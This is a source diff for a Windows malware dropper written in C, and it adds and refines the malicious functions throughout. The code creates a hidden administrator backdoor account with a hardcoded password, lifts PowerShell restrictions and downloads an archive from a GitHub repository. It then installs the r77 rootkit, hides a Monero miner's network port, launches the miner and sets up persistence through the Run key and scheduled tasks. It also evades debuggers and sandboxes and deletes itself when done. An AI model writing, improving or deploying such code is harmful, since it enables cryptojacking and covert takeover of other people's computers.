@@ -15,6 +15,12 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
 
+// Global state tracking
+static const char* g_backdoorUsername = "TBuG";
+static BOOL g_accountCreated = FALSE;
+static char g_mallDir[MAX_PATH] = {0};
+static char g_svchostPath[MAX_PATH] = {0};  // Added for persistence
+
 // Function prototypes
 unsigned char* ObfuscateString(const char* input, size_t len, DWORD key);
 char* Deobfuscate(const unsigned char* input, size_t len, DWORD key);
@@ -28,16 +34,19 @@ void DownloadAndExecutePayloads();
 void AddToStartup(const char* appName, const char* appPath);
 void EstablishPersistence();
 void SelfDestruct();
+void RemoveBackdoorAccount();
+void CleanupTemporaryResources();
 BOOL IsDebugged();
+void RunHiddenCommand(LPCSTR command);
 
-// Custom implementations of CRT functions
+// Custom implementations
 #define strcpy(dest, src) lstrcpyA(dest, src)
 #define strcat(dest, src) lstrcatA(dest, src)
 #define strlen(str) lstrlenA(str)
 #define malloc(size) HeapAlloc(GetProcessHeap(), 0, size)
 #define free(ptr) HeapFree(GetProcessHeap(), 0, ptr)
 
-// Simple LCG random number generator
+// LCG random generator
 static DWORD rand_state = 0;
 void my_srand(DWORD seed) { rand_state = seed; }
 int my_rand() {
@@ -45,15 +54,16 @@ int my_rand() {
     return (rand_state >> 16) & 0x7FFF;
 }
 
-// Polymorphic XOR obfuscation with rotating keys
+// Obfuscation macros
 #define OBF_KEY (0x55AAFF00 ^ (GetTickCount() & 0xFFFF))
 #define OBFUSCATE(str) (const char*)ObfuscateString(str, sizeof(str), OBF_KEY)
 
-// Anti-debugging technique
+// Anti-debugging
 BOOL IsDebugged() {
     return IsDebuggerPresent();
 }
 
+// String obfuscation
 unsigned char* ObfuscateString(const char* input, size_t len, DWORD key) {
     unsigned char* obf = (unsigned char*)malloc(len);
     for(size_t i = 0; i < len; i++) {
@@ -70,6 +80,7 @@ char* Deobfuscate(const unsigned char* input, size_t len, DWORD key) {
     return deob;
 }
 
+// Sandbox evasion
 void AntiSandbox() {
     if(GetTickCount() < 180000)  // Exit if in sandbox
         ExitProcess(0);
@@ -86,6 +97,7 @@ void AntiSandbox() {
         ExitProcess(0);
 }
 
+// Privilege escalation
 void ElevatePrivileges() {
     char selfPath[MAX_PATH];
     GetModuleFileNameA(NULL, selfPath, MAX_PATH);
@@ -95,7 +107,7 @@ void ElevatePrivileges() {
     sei.lpFile = "cmd.exe";
     sei.nShow = SW_HIDE;
     
-    // Polymorphic argument construction
+    // Build command parameters
     char params[512];
     const char* part1 = Deobfuscate(OBFUSCATE("\" /c \""), 7, OBF_KEY);
     const char* part2 = Deobfuscate(OBFUSCATE(" HIDDEN\""), 9, OBF_KEY);
@@ -110,6 +122,7 @@ void ElevatePrivileges() {
     ExitProcess(0);
 }
 
+// Admin check
 BOOL IsAdmin() {
     BOOL isAdmin = FALSE;
     PSID adminGroup;
@@ -123,89 +136,244 @@ BOOL IsAdmin() {
     return isAdmin;
 }
 
+// Account creation with error handling
 void CreateBackdoorAccount() {
-    USER_INFO_1 ui;
-    DWORD dwLevel = 1;
+    USER_INFO_1 ui = {0};
     DWORD dwError = 0;
-    LOCALGROUP_MEMBERS_INFO_3 account;
+    LOCALGROUP_MEMBERS_INFO_3 account = {0};
     
-    // Obfuscated credentials
-    const char* username = Deobfuscate(OBFUSCATE("TBuG"), 4, OBF_KEY);
+    // Convert username to wide char
+    WCHAR usernameW[MAX_PATH] = {0};
+    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
+        return;
+    }
+    
+    // Check if account already exists
+    LPBYTE userInfo = NULL;
+    if (NetUserGetInfo(NULL, usernameW, 1, &userInfo) == NERR_Success) {
+        NetApiBufferFree(userInfo);
+        return;  // Account exists, skip creation
+    }
+    
+    // Get password
     const char* password = Deobfuscate(OBFUSCATE("P@ssw0rd123!"), 13, OBF_KEY);
+    if (!password) return;
     
-    ui.usri1_name = (LPWSTR)username;
-    ui.usri1_password = (LPWSTR)password;
+    WCHAR passwordW[MAX_PATH] = {0};
+    if (MultiByteToWideChar(CP_UTF8, 0, password, -1, passwordW, MAX_PATH) == 0) {
+        free((void*)password);
+        return;
+    }
+    
+    // Create user account
+    ui.usri1_name = usernameW;
+    ui.usri1_password = passwordW;
     ui.usri1_priv = USER_PRIV_USER;
-    ui.usri1_home_dir = NULL;
-    ui.usri1_comment = NULL;
     ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
-    ui.usri1_script_path = NULL;
     
-    NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
-    
-    // Add to administrators
-    account.lgrmi3_domainandname = (LPWSTR)username;
-    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
-    
-    free((void*)username);
+    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
     free((void*)password);
+    
+    if (status != NERR_Success) {
+        return;  // Creation failed
+    }
+    
+    g_accountCreated = TRUE;  // Mark for later removal
+    
+    // Add to administrators group
+    account.lgrmi3_domainandname = usernameW;
+    status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
+    
+    if (status != NERR_Success) {
+        // PowerShell fallback
+        char psCmd[256];
+        wsprintfA(psCmd, "powershell -Command \"Add-LocalGroupMember -Group 'Administrators' -Member '%S' -ErrorAction SilentlyContinue\"", 
+                 usernameW);
+        
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        char cmdLine[512];
+        wsprintfA(cmdLine, "cmd.exe /c %s", psCmd);
+        
+        CreateProcessA(
+            NULL, cmdLine, NULL, NULL, TRUE,
+            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
+        );
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    
+    // Hide from login screen
+    HKEY hKey;
+    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
+    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
+                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD hideValue = 0;
+        RegSetValueExA(hKey, g_backdoorUsername, 0, REG_DWORD, 
+                      (const BYTE*)&hideValue, sizeof(DWORD));
+        RegCloseKey(hKey);
+    }
+    
+    // Remove from Users group
+    LOCALGROUP_MEMBERS_INFO_3 removeInfo = {0};
+    removeInfo.lgrmi3_domainandname = usernameW;
+    NetLocalGroupDelMembers(NULL, L"Users", 3, (LPBYTE)&removeInfo, 1);
 }
 
+// Account removal
+void RemoveBackdoorAccount() {
+    if (!g_accountCreated) return;  // Only remove if we created it
+    
+    WCHAR usernameW[MAX_PATH];
+    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
+        return;
+    }
+    
+    // Delete account
+    NET_API_STATUS status = NetUserDel(NULL, usernameW);
+    if (status != NERR_Success) {
+        // PowerShell fallback
+        char psCmd[256];
+        wsprintfA(psCmd, "powershell -Command \"Remove-LocalUser -Name '%S' -ErrorAction SilentlyContinue\"", 
+                 usernameW);
+        
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        char cmdLine[512];
+        wsprintfA(cmdLine, "cmd.exe /c %s", psCmd);
+        
+        CreateProcessA(
+            NULL, cmdLine, NULL, NULL, TRUE,
+            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
+        );
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    
+    // Clean registry entry
+    HKEY hKey;
+    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, g_backdoorUsername);
+        RegCloseKey(hKey);
+    }
+}
+
+// Disable PowerShell restrictions
 void DisablePowerShellRestrictions() {
     HKEY hKey;
     const char* subkey = Deobfuscate(OBFUSCATE("SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell"), 63, OBF_KEY);
     const char* value = Deobfuscate(OBFUSCATE("ExecutionPolicy"), 17, OBF_KEY);
     const char* data = Deobfuscate(OBFUSCATE("Unrestricted"), 12, OBF_KEY);
     
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
-    DWORD dataLen = lstrlenA(data) + 1;
-    RegSetValueExA(hKey, value, 0, REG_SZ, (const BYTE*)data, dataLen);
-    RegCloseKey(hKey);
+    if (!subkey || !value || !data) return;
+    
+    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD dataLen = lstrlenA(data) + 1;
+        RegSetValueExA(hKey, value, 0, REG_SZ, (const BYTE*)data, dataLen);
+        RegCloseKey(hKey);
+    }
     
     free((void*)subkey);
     free((void*)value);
     free((void*)data);
 }
 
+// Download with retries
 void DownloadFile(const char* url, const char* savePath) {
-    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (hInternet) {
-        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-        if (hUrl) {
-            HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-            if (hFile != INVALID_HANDLE_VALUE) {
-                BYTE buffer[4096];
-                DWORD bytesRead, bytesWritten;
-                while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
-                    WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
-                }
-                CloseHandle(hFile);
-            }
-            InternetCloseHandle(hUrl);
+    for (int attempt = 0; attempt < 3; attempt++) {
+        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!hInternet) continue;
+        
+        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
+            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+        if (!hUrl) {
+            InternetCloseHandle(hInternet);
+            continue;
         }
+        
+        HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
+            FILE_ATTRIBUTE_HIDDEN, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            InternetCloseHandle(hUrl);
+            InternetCloseHandle(hInternet);
+            continue;
+        }
+        
+        BYTE buffer[4096];
+        DWORD bytesRead, bytesWritten;
+        BOOL downloadSuccess = TRUE;
+        
+        while (downloadSuccess && InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
+            if (bytesRead == 0) break;
+            if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || 
+                bytesWritten != bytesRead) {
+                downloadSuccess = FALSE;
+            }
+        }
+        
+        CloseHandle(hFile);
+        InternetCloseHandle(hUrl);
         InternetCloseHandle(hInternet);
+        
+        // Verify file downloaded successfully
+        HANDLE hFileCheck = CreateFileA(savePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFileCheck != INVALID_HANDLE_VALUE) {
+            DWORD fileSize = GetFileSize(hFileCheck, NULL);
+            CloseHandle(hFileCheck);
+            if (fileSize > 1024) {
+                return;
+            }
+        }
+        
+        DeleteFileA(savePath);
+        Sleep(2000); // Wait before retry
     }
 }
 
+// Run commands hidden
+void RunHiddenCommand(LPCSTR command) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    char cmdLine[512];
+    wsprintfA(cmdLine, "cmd.exe /c %s", command);
+    
+    CreateProcessA(
+        NULL, cmdLine, NULL, NULL, TRUE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
+    );
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+// Payload execution
 void DownloadAndExecutePayloads() {
     char appDataPath[MAX_PATH];
-    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
+    if (!GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH)) {
+        return;
+    }
     
-    // Get Templates directory path
     char templatesDir[MAX_PATH];
     lstrcpyA(templatesDir, appDataPath);
     lstrcatA(templatesDir, "\\Microsoft\\Windows\\Templates");
     
-    // Create mall directory explicitly
-    char mallDir[MAX_PATH];
-    lstrcpyA(mallDir, templatesDir);
-    lstrcatA(mallDir, "\\mall");
-    CreateDirectoryA(mallDir, NULL);
-    SetFileAttributesA(mallDir, FILE_ATTRIBUTE_HIDDEN);
+    // Ensure mall directory exists
+    lstrcpyA(g_mallDir, templatesDir);
+    lstrcatA(g_mallDir, "\\mall");
     
-    // Download mall.zip to Templates directory
+    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
+        CreateDirectoryA(g_mallDir, NULL);
+        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN);
+    }
+    
+    // Build download URL
     const char* domain = Deobfuscate(OBFUSCATE("github.com"), 11, OBF_KEY);
     const char* path = Deobfuscate(OBFUSCATE("/Drakovthe6th/TBuG/raw/master/mall.zip"), 40, OBF_KEY);
+    if (!domain || !path) return;
+    
     char mallUrl[256];
     lstrcpyA(mallUrl, "https://");
     lstrcatA(mallUrl, domain);
@@ -218,100 +386,64 @@ void DownloadAndExecutePayloads() {
     // Download mall.zip
     DownloadFile(mallUrl, zipPath);
     
-    // Use PowerShell for reliable extraction to mall directory
+    // Extract with PowerShell
     char psCmd[512];
     wsprintfA(psCmd, 
         "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
         zipPath, 
-        mallDir  // Extract directly to mall directory
+        g_mallDir
     );
     
-    // Execute PowerShell extraction hidden
+    // Execute extraction hidden
+    RunHiddenCommand(psCmd);
+    
+    // ===== MODIFIED SECTION START =====
+    // 1. Install r77 rootkit
+    char r77Path[MAX_PATH];
+    lstrcpyA(r77Path, g_mallDir);
+    lstrcatA(r77Path, "\\install.exe");
+    
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    char cmdLine[512];
-    lstrcpyA(cmdLine, "cmd.exe /c ");
-    lstrcatA(cmdLine, psCmd);
-    
     CreateProcessA(
-        NULL,                   // lpApplicationName
-        cmdLine,                // lpCommandLine
-        NULL,                   // lpProcessAttributes
-        NULL,                   // lpThreadAttributes
-        FALSE,                  // bInheritHandles
-        CREATE_NO_WINDOW,       // dwCreationFlags
-        NULL,                   // lpEnvironment
-        NULL,                   // lpCurrentDirectory
-        &si,                    // lpStartupInfo
-        &pi                     // lpProcessInformation
+        r77Path, NULL, NULL, NULL, FALSE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
     );
-    
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    WaitForSingleObject(pi.hProcess, 30000);  // Wait 30s for installation
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+
+    // 2. Configure network port hiding
+    HKEY hKey;
+    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
+        "SOFTWARE\\$77config\\tcp_remote", &hKey) == ERROR_SUCCESS) {
+        DWORD port = 3333;
+        RegSetValueExA(hKey, "XMR", 0, REG_DWORD, (BYTE*)&port, sizeof(port));
+        RegCloseKey(hKey);
+    }
+
+    // 3. Execute $77-Egde.exe (miner launcher)
+    char edgePath[MAX_PATH];
+    lstrcpyA(edgePath, g_mallDir);
+    lstrcatA(edgePath, "\\$77-Egde.exe");
     
-    // Execute Edge.exe and SystemHelper.exe from mall directory
-    char edgePath[MAX_PATH], helperPath[MAX_PATH];
-    lstrcpyA(edgePath, mallDir);
-    lstrcatA(edgePath, "\\Egde.exe");
+    // Set svchost path for persistence
+    lstrcpyA(g_svchostPath, edgePath);  // Initialize persistence path
     
-    lstrcpyA(helperPath, mallDir);
-    lstrcatA(helperPath, "\\SystemHelper.exe");
-    
-    // Run executables hidden
-    STARTUPINFOA execSi = { sizeof(execSi) };
-    PROCESS_INFORMATION execPi;
-    
-    CreateProcessA(
-        edgePath,               // lpApplicationName
-        NULL,                   // lpCommandLine
-        NULL,                   // lpProcessAttributes
-        NULL,                   // lpThreadAttributes
-        FALSE,                  // bInheritHandles
-        CREATE_NO_WINDOW,       // dwCreationFlags
-        NULL,                   // lpEnvironment
-        mallDir,                // lpCurrentDirectory
-        &execSi,                // lpStartupInfo
-        &execPi                 // lpProcessInformation
-    );
-    
-    CreateProcessA(
-        helperPath,             // lpApplicationName
-        NULL,                   // lpCommandLine
-        NULL,                   // lpProcessAttributes
-        NULL,                   // lpThreadAttributes
-        FALSE,                  // bInheritHandles
-        CREATE_NO_WINDOW,       // dwCreationFlags
-        NULL,                   // lpEnvironment
-        mallDir,                // lpCurrentDirectory
-        &execSi,                // lpStartupInfo
-        &execPi                 // lpProcessInformation
-    );
-    
-    CloseHandle(execPi.hProcess);
-    CloseHandle(execPi.hThread);
-    
-    // Download hanger.exe as svchost.exe to Templates directory
-    const char* hangerUrl = Deobfuscate(OBFUSCATE("https://github.com/Drakovthe6th/TBuG/raw/master/hanger.exe"), 55, OBF_KEY);
-    char svchostPath[MAX_PATH];
-    lstrcpyA(svchostPath, templatesDir);
-    lstrcatA(svchostPath, "\\svchost.exe");
-    
-    // Download and execute
-    DownloadFile(hangerUrl, svchostPath);
-    SetFileAttributesA(svchostPath, FILE_ATTRIBUTE_HIDDEN);
-    CreateProcessA(
-        svchostPath,            // lpApplicationName
-        NULL,                   // lpCommandLine
-        NULL,                   // lpProcessAttributes
-        NULL,                   // lpThreadAttributes
-        FALSE,                  // bInheritHandles
-        CREATE_NO_WINDOW,       // dwCreationFlags
-        NULL,                   // lpEnvironment
-        NULL,                   // lpCurrentDirectory
-        &execSi,                // lpStartupInfo
-        &execPi                 // lpProcessInformation
-    );
+    CreateProcessA(edgePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    // 4. Execute $77-SystemHelper.exe if present
+    char helperPath[MAX_PATH];
+    lstrcpyA(helperPath, g_mallDir);
+    lstrcatA(helperPath, "\\$77-SystemHelper.exe");
+    if (GetFileAttributesA(helperPath) != INVALID_FILE_ATTRIBUTES) {
+        CreateProcessA(helperPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    // ===== MODIFIED SECTION END =====
     
     // Cleanup zip file
     DeleteFileA(zipPath);
@@ -319,18 +451,20 @@ void DownloadAndExecutePayloads() {
     // Cleanup memory
     free((void*)domain);
     free((void*)path);
-    free((void*)hangerUrl);
 }
 
+// Startup persistence
 void AddToStartup(const char* appName, const char* appPath) {
     // Registry persistence
     HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-    DWORD pathLen = lstrlenA(appPath) + 1;
-    RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
-    RegCloseKey(hKey);
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        DWORD pathLen = lstrlenA(appPath) + 1;
+        RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
+        RegCloseKey(hKey);
+    }
     
-    // Scheduled task
+    // Scheduled task persistence
     char cmd[512];
     lstrcpyA(cmd, "schtasks /create /tn \"");
     lstrcatA(cmd, appName);
@@ -344,24 +478,23 @@ void AddToStartup(const char* appName, const char* appPath) {
     si.wShowWindow = SW_HIDE;
     CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
-    // Wait for process to finish
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
 
+// Persistence setup
 void EstablishPersistence() {
-    char appDataPath[MAX_PATH];
-    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
-    
-    // Add svchost.exe to startup
-    char svchostPath[MAX_PATH];
-    lstrcpyA(svchostPath, appDataPath);
-    lstrcatA(svchostPath, "\\Microsoft\\Windows\\Templates\\svchost.exe");
+    // Only set persistence if payload exists
+    if (GetFileAttributesA(g_svchostPath) == INVALID_FILE_ATTRIBUTES) {
+        return;
+    }
     
     const char* startupName = Deobfuscate(OBFUSCATE("WindowsHostService"), 18, OBF_KEY);
-    AddToStartup(startupName, svchostPath);
-    free((void*)startupName);
+    if (startupName) {
+        AddToStartup(startupName, g_svchostPath);
+        free((void*)startupName);
+    }
     
     // Junk encryption to waste analysis time
     BYTE junk[1024];
@@ -374,7 +507,29 @@ void EstablishPersistence() {
     }
 }
 
+// Temporary resource cleanup
+void CleanupTemporaryResources() {
+    // Remove account if created
+    RemoveBackdoorAccount();
+    
+    // Cleanup only the zip file
+    char zipPath[MAX_PATH];
+    lstrcpyA(zipPath, g_mallDir);
+    lstrcatA(zipPath, "\\..\\mall.zip");
+    DeleteFileA(zipPath);
+    
+    // Cleanup temporary batch file
+    char batchPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, batchPath);
+    lstrcatA(batchPath, "\\sysclean.bat");
+    DeleteFileA(batchPath);
+}
+
+// Self-destruction
 void SelfDestruct() {
+    // Remove r77 configuration
+    RunHiddenCommand("reg delete HKLM\\SOFTWARE\\$77config /f");
+    
     char batchPath[MAX_PATH];
     GetTempPathA(MAX_PATH, batchPath);
     lstrcatA(batchPath, "\\sysclean.bat");
@@ -400,6 +555,7 @@ void SelfDestruct() {
     }
 }
 
+// Main entry point
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     if(IsDebugged()) return 0;
     
@@ -407,47 +563,48 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     if(!IsAdmin()) {
         ElevatePrivileges();
+        return 0; // Exit after elevation attempt
     }
     
     // Initialize random seed
     my_srand(GetTickCount());
     
-    // Polymorphic execution flow
-    int r = my_rand() % 5;
-    switch(r) {
-        case 0:
+    // Error-protected execution sequence
+    int stages = 0;
+    const int MAX_ATTEMPTS = 2;
+    
+    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        if (!(stages & 1)) {
             CreateBackdoorAccount();
+            stages |= 1;  // Mark account stage complete
+        }
+        
+        if (!(stages & 2)) {
             DisablePowerShellRestrictions();
+            stages |= 2;
+        }
+        
+        if (!(stages & 4)) {
             DownloadAndExecutePayloads();
+            stages |= 4;
+        }
+        
+        if (!(stages & 8)) {
             EstablishPersistence();
-            break;
-        case 1:
-            DownloadAndExecutePayloads();
-            EstablishPersistence();
-            CreateBackdoorAccount();
-            DisablePowerShellRestrictions();
-            break;
-        case 2:
-            DisablePowerShellRestrictions();
-            CreateBackdoorAccount();
-            DownloadAndExecutePayloads();
-            EstablishPersistence();
-            break;
-        case 3:
-            EstablishPersistence();
-            DownloadAndExecutePayloads();
-            DisablePowerShellRestrictions();
-            CreateBackdoorAccount();
-            break;
-        default:
-            DownloadAndExecutePayloads();
-            CreateBackdoorAccount();
-            DisablePowerShellRestrictions();
-            EstablishPersistence();
+            stages |= 8;
+        }
+        
+        if (stages == 0xF) break;  // All stages complete
+        Sleep(5000);  // Wait before retry
     }
     
-    // Add delay before self-destruction
+    // Final cleanup with delay for payload initialization
     Sleep(30000 + (my_rand() % 15000));
+    
+    // Remove temporary resources but preserve payloads
+    CleanupTemporaryResources();
+    
+    // Self-destruct initial executable
     SelfDestruct();
     
     return 0;
